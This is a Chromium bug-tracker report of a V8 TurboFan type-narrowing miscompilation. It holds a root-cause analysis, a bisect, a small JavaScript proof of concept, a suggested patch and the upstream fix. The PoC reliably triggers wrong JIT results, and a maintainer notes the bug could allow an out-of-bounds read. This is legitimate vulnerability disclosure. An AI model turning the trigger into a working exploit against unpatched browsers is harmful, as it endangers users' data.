# V8: JIT Miscompilation via Incorrect Type Narrowing in TurboFan SpeculativeAdditiveSafeIntegerAdd

| Field | Value |
|-------|-------|
| **Issue ID** | [499659070](https://issues.chromium.org/issues/499659070) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Blink>JavaScript>Compiler>Turbofan |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | ca...@gmail.com |
| **Assignee** | vi...@chromium.org |
| **Created** | 2026-04-06 |
| **Bounty** | $3,000.00 |

## Description

## VULNERABILITY DETAILS

### Summary

A type narrowing bug in TurboFan's `OperationTyper::SpeculativeAdditiveSafeIntegerAdd` causes the compiler to compute an incorrectly narrow result type when the mathematical sum can exceed the `kAdditiveSafeInteger` range `[-2^52, 2^52-1]`. The function intersects the result type with `kAdditiveSafeInteger` when **either** input is in range (OR condition), but when both inputs are in range and their sum exceeds the range, the intersection clips the result to just 2 values instead of 2^32. After algebraic simplification of `(x + C) - C -> x`, the incorrect type `Range(0, 1)` persists on the result node, causing `TypeNarrowingReducer` to fold comparisons and `ConstantFoldingReducer` to eliminate reachable branches, producing wrong JavaScript results. The bug is reproducible on all 64-bit architectures with default V8 flags and no special command-line options.

### Overview

The root cause is in `OperationTyper::SpeculativeAdditiveSafeIntegerAdd` (`src/compiler/operation-typer.cc:721-728`). The function intersects the addition result type with `kAdditiveSafeInteger` (range `[-2^52, 2^52-1]`) when **either** input type is a subset of `kAdditiveSafeInteger` (OR condition on line 723). This creates an incorrectly narrow result type when the mathematical sum can exceed the `kAdditiveSafeInteger` bounds, even though both inputs individually are within range.

When a subsequent subtraction of the same constant creates an algebraic identity `(x + C) - C`, the `MachineOperatorReducer` eliminates both operations and their runtime overflow checks. The incorrect type `Range(0, 1)` -- computed from the clipped intermediate -- persists on the result node, causing `TypeNarrowingReducer` to fold comparisons and `ConstantFoldingReducer` to eliminate branches, producing wrong JavaScript results.

### Detail

The vulnerable code in `OperationTyper::SpeculativeAdditiveSafeIntegerAdd`:

```
// src/compiler/operation-typer.cc:721-728
Type OperationTyper::SpeculativeAdditiveSafeIntegerAdd(Type lhs, Type rhs) {
  Type result = SpeculativeNumberAdd(lhs, rhs);
  if (lhs.Is(cache_->kAdditiveSafeInteger) ||    // <-- OR condition: only ONE input needs to be in range
      rhs.Is(cache_->kAdditiveSafeInteger)) {
    return Type::Intersect(result, cache_->kAdditiveSafeInteger, zone());  // <-- clips result to [-2^52, 2^52-1]
  }
  return result;
}

```

And the corresponding subtraction:

```
// src/compiler/operation-typer.cc:730-738
Type OperationTyper::SpeculativeAdditiveSafeIntegerSubtract(Type lhs,
                                                            Type rhs) {
  Type result = SpeculativeNumberSubtract(lhs, rhs);
  if (lhs.Is(cache_->kAdditiveSafeInteger) ||
      rhs.Is(cache_->kAdditiveSafeInteger)) {
    return Type::Intersect(result, cache_->kAdditiveSafeInteger, zone());
  }
  return result;
}

```

**How the miscompilation occurs (in pipeline execution order):**

1. **Incorrect Type Computation (Typer phase)**: For `ix` (`x >>> 0`, Uint32 range `[0, 2^32-1]`) -- which is a subset of `kAdditiveSafeInteger` -- adding constant `BASE = 2^52 - 2` produces `SpeculativeNumberAdd` result `Range(4503599627370494, 4503603922337789)`. The OR condition triggers (both inputs are individually within `kAdditiveSafeInteger`), and intersection with `kAdditiveSafeInteger` clips this to `Range(4503599627370494, 4503599627370495)` -- just 2 possible values instead of 2^32.
2. **Type Propagation (Typer phase)**: The subtraction `sum - BASE` is typed as `Range(0, 1)` by `SpeculativeAdditiveSafeIntegerSubtract`, because the subtraction ranger computes `Range(4503599627370494, 4503599627370495) - Range(4503599627370494, 4503599627370494) = Range(0, 1)`. The actual mathematical range should be `[0, 2^32-1]`.
3. **Algebraic Simplification (LateOptimization phase)**: The `MachineOperatorReducer` (`src/compiler/machine-operator-reducer.cc:1179-1196`) converts `(x + C) - C` into `x + C + (-C)`, then constant-folds `C + (-C) = 0` via `ReduceInt64Add` (`src/compiler/machine-operator-reducer.cc:1147-1155`), resulting in `x + 0 = x`. This eliminates both the addition and subtraction operations along with their `CheckedAdditiveSafeIntegerAdd/Sub` runtime overflow checks. The incorrect type `Range(0, 1)` from step 2 **persists on the result node** even though the actual runtime value is the unmodified `x >>> 0`.
4. **Comparison Folding (TypedOptimizations phase)**: `TypeNarrowingReducer` (`src/compiler/type-narrowing-reducer.cc:33-34`) folds `idx < 2` to `singleton_true` because `Range(0, 1).Max() = 1 < 2`:
   
   ```
   // src/compiler/type-narrowing-reducer.cc:33-34
   if (left_type.Max() < right_type.Min()) {
     new_type = op_typer_.singleton_true();
   }
   
   ```
5. **Branch Elimination (TypedOptimizations phase)**: `ConstantFoldingReducer` (`src/compiler/constant-folding-reducer.cc:31-32`) detects the singleton type and replaces the comparison with a constant, causing branch elimination to remove the reachable false branch:
   
   ```
   // src/compiler/constant-folding-reducer.cc:31-32
   } else if (type.Is(Type::PlainNumber()) && type.Min() == type.Max()) {
     result = jsgraph->ConstantNoHole(type.Min());
   
   ```

### Trigger Conditions

1. Target must be a 64-bit architecture (`additive_safe_int_feedback` flag is `true` by default only on 64-bit; `src/flags/flag-definitions.h:860-877`)
2. The addition operand must be within `kAdditiveSafeInteger` range (e.g., `x >>> 0` produces Uint32, a subset)
3. The constant added must be close to `kMaxAdditiveSafeInteger` (2^52 - 1) so that the sum can exceed the range
4. The addition must be paired with a subtraction of the same constant, enabling algebraic simplification
5. The result of the add-sub pair must be used in a comparison that can be folded by TypeNarrowingReducer
6. The function must be compiled by TurboFan (requires sufficient warmup or `%OptimizeFunctionOnNextCall`)

## Version

### Reproduced Version

- `main` branch latest commit (2026/04/06): `01333f9ce95`
- V8 14.9.0

### Bisect

The commit `0a1fae9e77c6d8e85d8197b4f4396815ec9194b9` introduces this bug.

```
commit 0a1fae9e77c6d8e85d8197b4f4396815ec9194b9
Author: Victor Gomes <victorgomes@chromium.org>
Date:   Tue Feb 11 14:13:21 2025 +0100

    [turbofan] Use AdditiveSafeInt feedback for faster int add/sub

    Add Int53 addition feedback and use it during simplified lowering
    to optimize integer addition and subtraction.  When one of the inputs
    is known to be within the Int53 range (since the check is relatively
    expensive), we can use a shifted integer addition instead of floating
    addition.

    AdditiveSafeInteger (Int53) is used instead of SafeInteger because
    the safe integer range (-2^53 + 1 to 2^53 -1) excludes -2^53.
    Using SafeInteger directly would require an additional check after
    the operation to ensure the result remains within the valid bounds.

    This change does *not* implement Maglev-specific optimizations.

    Bug: 384959125

    Change-Id: I7b54d075c55ab7828e407cec03933a34be6247d5
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/6038008
    Reviewed-by: Nico Hartmann <nicohartmann@chromium.org>
    Reviewed-by: Leszek Swirski <leszeks@chromium.org>
    Commit-Queue: Victor Gomes <victorgomes@chromium.org>
    Cr-Commit-Position: refs/heads/main@{#98643}

```

The first V8 milestone branch that contains this commit is `branch-heads/13.5` (Chrome M135). V8 `branch-heads/13.4` does NOT contain the commit.

## Reproduction Case

### Release Build

```
out/x64.release/d8 --allow-natives-syntax poc.js

```

Result:

```
=== Wrong Result ===
[Interpreter] f(5) = 5
[TurboFan]    f(5) = -1
Optimized: true

```
### Debug Build

```
out/x64.debug/d8 --allow-natives-syntax poc.js

```

Result:

```
=== Wrong Result ===
[Interpreter] f(5) = 5
[TurboFan]    f(5) = -1
Optimized: true

```

Also confirmed on ASAN release build (`out/x64.release_asan/d8 --allow-natives-syntax poc.js`) with identical results.

### PoC Code

```
// Run: out/x64.release/d8 --allow-natives-syntax poc.js
const BASE = 4503599627370494; // 2^52 - 2

function f_interp(x) {
  let ix = x >>> 0;
  let idx = (ix + BASE) - BASE;
  if (idx < 2) return -1;
  return idx;
}

// Separate function to avoid feedback pollution from f_interp(5),
// which would record idx=5 and prevent AdditiveSafeInteger speculation.
function f_jit(x) {
  let ix = x >>> 0;
  let idx = (ix + BASE) - BASE;
  if (idx < 2) return -1;
  return idx;
}

// --- Interpreter ---
const interp = f_interp(5);

// --- TurboFan (train only with 0,1 so feedback stays AdditiveSafeInteger) ---
%PrepareFunctionForOptimization(f_jit);
for (let i = 0; i < 10000; i++) { f_jit(0); f_jit(1); }
%OptimizeFunctionOnNextCall(f_jit);
f_jit(0);
const opt = f_jit(5);

print("=== Wrong Result ===");
print("[Interpreter] f(5) = " + interp);   // 5  (correct)
print("[TurboFan]    f(5) = " + opt);       // -1 (wrong)
print("Optimized: " + ((%GetOptimizationStatus(f_jit) & 32) !== 0));

```
## Suggested Patch

### `src/compiler/operation-typer.cc`

```
--- a/src/compiler/operation-typer.cc
+++ b/src/compiler/operation-typer.cc
@@ -721,7 +721,11 @@
 Type OperationTyper::SpeculativeAdditiveSafeIntegerAdd(Type lhs, Type rhs) {
   Type result = SpeculativeNumberAdd(lhs, rhs);
-  if (lhs.Is(cache_->kAdditiveSafeInteger) ||
-      rhs.Is(cache_->kAdditiveSafeInteger)) {
+  // Only narrow to kAdditiveSafeInteger when BOTH inputs are within range
+  // AND the computed result is already within range. With the OR condition,
+  // one input near the boundary plus any in-range value can produce a sum
+  // that exceeds the bounds, and the intersection clips the result type to
+  // a range that doesn't contain all possible values.
+  if (lhs.Is(cache_->kAdditiveSafeInteger) &&
+      rhs.Is(cache_->kAdditiveSafeInteger) &&
+      result.Is(cache_->kAdditiveSafeInteger)) {
     return Type::Intersect(result, cache_->kAdditiveSafeInteger, zone());
   }
   return result;
@@ -730,8 +734,9 @@
 Type OperationTyper::SpeculativeAdditiveSafeIntegerSubtract(Type lhs,
                                                             Type rhs) {
   Type result = SpeculativeNumberSubtract(lhs, rhs);
-  if (lhs.Is(cache_->kAdditiveSafeInteger) ||
-      rhs.Is(cache_->kAdditiveSafeInteger)) {
+  if (lhs.Is(cache_->kAdditiveSafeInteger) &&
+      rhs.Is(cache_->kAdditiveSafeInteger) &&
+      result.Is(cache_->kAdditiveSafeInteger)) {
     return Type::Intersect(result, cache_->kAdditiveSafeInteger, zone());
   }
   return result;

```
### Explanation

The fix changes the OR condition (`||`) to AND (`&&`) with an additional guard that the computed result is already within `kAdditiveSafeInteger`. The intersection is now only applied when it is provably a no-op (i.e., when both inputs AND the result are within bounds), so it can never incorrectly clip the result type.

The original OR condition was wrong because two values that are individually within `kAdditiveSafeInteger` (e.g., Uint32 `[0, 2^32-1]` and constant `2^52 - 2`) can sum to a value that exceeds the range. The intersection then clips the result to a range that excludes actually-reachable values, creating incorrect type information that persists through algebraic simplification and causes downstream miscompilation.

Note: `CanSpeculateAdditiveSafeInteger` in `simplified-lowering.cc:1839` does **not** need fixing. Its OR condition only controls whether `CheckedAdditiveSafeIntegerAdd/Sub` operations (with runtime overflow checks) are emitted -- a lowering decision. The bug is solely in the **typing** of the result.

### Credit Information

Reporter credit: Junyoung Park(@candymate) of KAIST Hacking Lab

## Attachments

- [poc.js](attachments/poc.js) (text/javascript, 987 B)

## Timeline

### ca...@gmail.com (2026-04-06)

Forgot to put attachment file

### dc...@chromium.org (2026-04-07)

triaging provisionally and passing off to the v8 team

### ch...@google.com (2026-04-07)

Setting milestone because of s0/s1 severity.

### ch...@google.com (2026-04-07)

Setting Priority to P1 to match Severity s1. To ensure SLOs are tracked correctly, priority must match or exceed severity.

### dm...@chromium.org (2026-04-07)

PTAL, Victor.

### vi...@chromium.org (2026-04-13)

This can cause a OOB read. Assigning medium severity (S2).

### dx...@google.com (2026-04-15)

Project: v8/v8  

Branch:  main  

Author:  Victor Gomes [victorgomes@chromium.org](mailto:victorgomes@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7748026>

[turbofan] Fix and simplify additive safe integer optimization

---


Expand for full commit details
```
     
    This CL simplifies the speculative optimization for additive safe 
    integers and introduces a safer margin for feedback ranges to prevent 
    overflow. 
     
    * Simplify optimization logic: Always perform the operation when the feedback is `AdditiveSafeInteger`, rather than relying on statically proving one side. This simplifies the operation typer and avoids range mistakes. 
    * Prevent bounds overflow: Introduce tighter feedback bounds (`kMaxAdditiveSafeIntegerFeedback` and `kMinAdditiveSafeIntegerFeedback` at ±2^51). This safer margin ensures that adding two minimum values together will no longer exceed the safe integer range. 
    * Update tests: Adjust `test/mjsunit/additive-safe-int-feedback.js` to reflect the newly introduced ranges. 
     
    Fixed: 499659070 
    Change-Id: Ic16dbb644b310bed24b169fed90c6637cac10daa 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7748026 
    Reviewed-by: Nico Hartmann <nicohartmann@chromium.org> 
    Commit-Queue: Victor Gomes <victorgomes@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#106492}

```

---

Files:

- M `src/builtins/builtins-number-tsa.cc`
- M `src/codegen/code-stub-assembler.cc`
- M `src/common/globals.h`
- M `src/compiler/operation-typer.cc`
- M `src/compiler/representation-change.cc`
- M `src/compiler/simplified-lowering.cc`
- M `src/compiler/turboshaft/graph-builder.cc`
- M `src/compiler/turboshaft/machine-lowering-reducer-inl.h`
- M `src/compiler/type-cache.h`
- M `test/mjsunit/additive-safe-int-feedback.js`

---

Hash: [330a25ad001ee1ac3b7a2176a1f175cee2592a5f](https://chromiumdash.appspot.com/commit/330a25ad001ee1ac3b7a2176a1f175cee2592a5f)  

Date: Wed Apr 15 08:29:16 2026


---

### sp...@google.com (2026-06-22)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $3000.00 for this report.

Rationale for this decision:
Baseline. User information disclosure with bisect.


Important: If you aren't already registered with Google as a supplier, p2p-vrp@google.com will reach out to you. If you have registered in the past, no need to repeat the process – you can sit back and relax, and we will process the payment soon.

If you have any payment related requests, please direct them to p2p-vrp@google.com. Please remember to include the subject of this email and the email address that the report was sent from.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

### ch...@google.com (2026-07-23)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/499659070)*
